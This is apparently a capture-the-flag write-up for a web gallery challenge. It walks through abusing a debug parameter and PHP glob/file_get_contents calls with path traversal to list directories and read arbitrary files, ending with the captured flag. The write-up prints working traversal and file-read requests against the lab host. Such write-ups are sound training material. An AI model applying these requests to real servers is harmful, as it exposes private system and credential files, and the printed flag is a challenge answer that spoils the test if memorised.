A seemingly innocuous galleria, but nothing is ever innocuous. First up, view
the home page's source and you'll spot some interesting looking code down at
the bottom:

```  
	// ~~~~~~  mY oWn CuStOm CoDe ~~~~~~    
	// Written by developer_user  
	var canRun = 0;  
   $(document).ready(function(){  
       $.ajax({url: "get_files_items.php?debug=FALSE&folder=images", async: false, success: function(result){  
       	$("#get_pictures").html(result);  
		}});  
		runMe();  
	});  
  
	// ~~~~~~ eNd mY oWn CuStOm CoDe ~~~~~~   
```

Hmm, looks like possible path traversal? Throw that path into the URL to get:
[http://134.122.94.112/get_files_items.php?debug=TRUE&folder=images](http://134.122.94.112/get_files_items.php?debug=TRUE&folder=images)

You'll notice that it spits out the directory contents. Turning debug to TRUE
yields some more information:

```  
DEBUG Message: Getting a list op all the files in folder: images from the
param folder using PHP function 'glob'.

Code Debug:  
$folder = $_REQUEST["folder"];  
$pictues = glob($folder . "/*");  
```

Since it's just using glob, we can use it to list the files of any directory
on the drive. Let's try some relative paths and see where that gets us:
[http://134.122.94.112/get_files_items.php?debug=TRUE&folder=../](http://134.122.94.112/get_files_items.php?debug=TRUE&folder=../)

One set of links loads up, and if you look at the Work 01 and Model links you
can see which files and directories are in the path specified. With just ../,
only an html folder comes up. Using `get_files_items.php` we can see what's
inside the html folder:
[http://134.122.94.112/get_files_items.php?debug=TRUE&folder=../html](http://134.122.94.112/get_files_items.php?debug=TRUE&folder=../html)

Scrolling through the links you'll find a folder titled
`clue_folder_good_job`. Since the html directory is the root path of the
webserver, to access it you can just go to:
[http://134.122.94.112/clue_folder_good_job/](http://134.122.94.112/clue_folder_good_job/)

In it, you'll find `clue.txt`, the contents of which are:

```  
Well Done!  
The developer wrote the secret key somewhere on machine...  
Clue: The file you are using to exploit has an older version somewhere, good
luck.  
```

Using the clue, let's keep looking through that html directory. You'll find a
directory called `php_folder_cant_find_me_by_brute_force`. Inside, you'll find
a php script called `old_get_files_items.php`. Upon loading, it complains
about debug mode being off. Expecting the syntax to be the same as the newer
version, at a parameter of `?debug=TRUE` to the query to get:

```  
Code Debug:  
$file = $_REQUEST["file"];  
print file_get_contents($file);  
```

What this older script is doing is letting us view the contents of files now,
rather than the file tree. We still need to find the flag, though. The first
place I thought to check was in the system's home directory, so I navigated
to:
[http://134.122.94.112/get_files_items.php?debug=TRUE&folder=/home/](http://134.122.94.112/get_files_items.php?debug=TRUE&folder=/home/)

Inside the home directory, there is a user `developer`. Inside the user's home
folder, there is a `FLAG.txt`. Bingo! Now, using the `old_get_files_items.php`
from before, we can go to:
[http://134.122.94.112/php_folder_cant_find_me_by_brute_force/old_get_files_items.php?debug=TRUE&file=/home/developer/FLAG.txt](http://134.122.94.112/php_folder_cant_find_me_by_brute_force/old_get_files_items.php?debug=TRUE&file=/home/developer/FLAG.txt)

```  
Code Debug:  
$file = $_REQUEST["file"];  
print file_get_contents($file);

S1FLAG.xDI0UiExW4pALibNe8aq4BDvHuk  
```